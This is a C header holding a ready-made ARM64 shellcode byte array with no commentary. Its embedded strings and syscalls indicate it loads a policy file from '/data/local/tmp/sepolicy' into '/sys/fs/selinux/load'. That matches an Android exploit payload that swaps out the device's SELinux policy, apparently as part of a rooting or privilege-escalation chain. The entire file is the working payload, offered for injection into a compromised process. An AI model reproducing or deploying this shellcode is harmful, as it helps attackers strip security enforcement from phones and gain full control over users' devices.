#ifndef __SHELLCODE_H__
#define __SHELLCODE_H__
unsigned char shellcode[] = {
  0xff, 0x07, 0x40, 0xd1, 0xe0, 0x03, 0x00, 0xf9, 0xe1, 0x07, 0x00, 0xf9,
  0xe2, 0x0b, 0x00, 0xf9, 0xe3, 0x0f, 0x00, 0xf9, 0xe4, 0x13, 0x00, 0xf9,
  0xe5, 0x17, 0x00, 0xf9, 0xe6, 0x1b, 0x00, 0xf9, 0xe7, 0x1f, 0x00, 0xf9,
  0xe8, 0x23, 0x00, 0xf9, 0xe9, 0x27, 0x00, 0xf9, 0xea, 0x2b, 0x00, 0xf9,
  0xeb, 0x2f, 0x00, 0xf9, 0xec, 0x33, 0x00, 0xf9, 0xed, 0x37, 0x00, 0xf9,
  0xee, 0x3b, 0x00, 0xf9, 0xef, 0x3f, 0x00, 0xf9, 0x00, 0x00, 0x80, 0xd2,
  0x01, 0x08, 0x00, 0x10, 0x42, 0x00, 0x80, 0xd2, 0x08, 0x07, 0x80, 0xd2,
  0x01, 0x00, 0x00, 0xd4, 0xef, 0x03, 0x00, 0xaa, 0x00, 0x00, 0x80, 0xd2,
  0xe1, 0x07, 0x00, 0x30, 0x02, 0x00, 0x80, 0xd2, 0x08, 0x07, 0x80, 0xd2,
  0x01, 0x00, 0x00, 0xd4, 0xee, 0x03, 0x00, 0xaa, 0xe0, 0x03, 0x0e, 0xaa,
  0x01, 0x00, 0x80, 0xd2, 0x42, 0x00, 0x80, 0xd2, 0xc8, 0x07, 0x80, 0xd2,
  0x01, 0x00, 0x00, 0xd4, 0xed, 0x03, 0x00, 0xaa, 0xe0, 0x03, 0x0e, 0xaa,
  0x01, 0x00, 0x80, 0xd2, 0x02, 0x00, 0x80, 0xd2, 0xc8, 0x07, 0x80, 0xd2,
  0x01, 0x00, 0x00, 0xd4, 0x00, 0x00, 0x80, 0xd2, 0xe1, 0x03, 0x0d, 0xaa,
  0x22, 0x00, 0x80, 0xd2, 0x43, 0x00, 0x80, 0xd2, 0xe4, 0x03, 0x0e, 0xaa,
  0x05, 0x00, 0x80, 0xd2, 0xc8, 0x1b, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4,
  0xec, 0x03, 0x00, 0xaa, 0xe0, 0x03, 0x0f, 0xaa, 0xe1, 0x03, 0x0c, 0xaa,
  0xe2, 0x03, 0x0d, 0xaa, 0x08, 0x08, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4,
  0xe0, 0x03, 0x0c, 0xaa, 0xe1, 0x03, 0x0d, 0xaa, 0xe8, 0x1a, 0x80, 0xd2,
  0x01, 0x00, 0x00, 0xd4, 0xe0, 0x03, 0x0f, 0xaa, 0x28, 0x07, 0x80, 0xd2,
  0x01, 0x00, 0x00, 0xd4, 0xe0, 0x03, 0x0e, 0xaa, 0x28, 0x07, 0x80, 0xd2,
  0x01, 0x00, 0x00, 0xd4, 0xe0, 0x03, 0x40, 0xf9, 0xe1, 0x07, 0x40, 0xf9,
  0xe2, 0x0b, 0x40, 0xf9, 0xe3, 0x0f, 0x40, 0xf9, 0xe4, 0x13, 0x40, 0xf9,
  0xe5, 0x17, 0x40, 0xf9, 0xe6, 0x1b, 0x40, 0xf9, 0xe7, 0x1f, 0x40, 0xf9,
  0xe8, 0x23, 0x40, 0xf9, 0xe9, 0x27, 0x40, 0xf9, 0xea, 0x2b, 0x40, 0xf9,
  0xeb, 0x2f, 0x40, 0xf9, 0xec, 0x33, 0x40, 0xf9, 0xed, 0x37, 0x40, 0xf9,
  0xee, 0x3b, 0x40, 0xf9, 0xef, 0x3f, 0x40, 0xf9, 0xff, 0x07, 0x40, 0x91,
  0xc0, 0x03, 0x5f, 0xd6, 0x2f, 0x73, 0x79, 0x73, 0x2f, 0x66, 0x73, 0x2f,
  0x73, 0x65, 0x6c, 0x69, 0x6e, 0x75, 0x78, 0x2f, 0x6c, 0x6f, 0x61, 0x64,
  0x00, 0x2f, 0x64, 0x61, 0x74, 0x61, 0x2f, 0x6c, 0x6f, 0x63, 0x61, 0x6c,
  0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x73, 0x65, 0x70, 0x6f, 0x6c, 0x69, 0x63,
  0x79, 0x00, 0x2f, 0x64, 0x61, 0x74, 0x61, 0x2f, 0x6c, 0x6f, 0x63, 0x61,
  0x6c, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x4c, 0x41, 0x53, 0x54, 0x00
};
unsigned int shellcode_len = 395;
#endif
